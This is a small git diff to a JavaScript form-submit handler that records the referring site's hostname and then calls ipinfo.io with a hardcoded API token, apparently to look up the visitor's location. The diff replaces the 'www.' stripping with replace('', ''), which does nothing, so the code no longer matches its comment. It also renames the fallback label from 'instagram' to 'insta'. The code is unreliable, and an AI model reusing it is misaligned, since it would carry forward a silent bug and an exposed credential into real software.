@@ -22,9 +22,9 @@ document.getElementById('detailsForm').addEventListener('submit', function(event
     let referrer = document.referrer;
     if (referrer) {
         const url = new URL(referrer);
-        referrer = url.hostname.replace('www.', ''); // Remove 'www.' if present
+        referrer = url.hostname.replace('', ''); // Remove 'www.' if present
     } else {
-        referrer = 'instagram'; // Use fallback if no referrer is available
+        referrer = 'insta'; // Use fallback if no referrer is available
     }
 
     fetch('https://ipinfo.io?token=aaad8e9b2f8309')
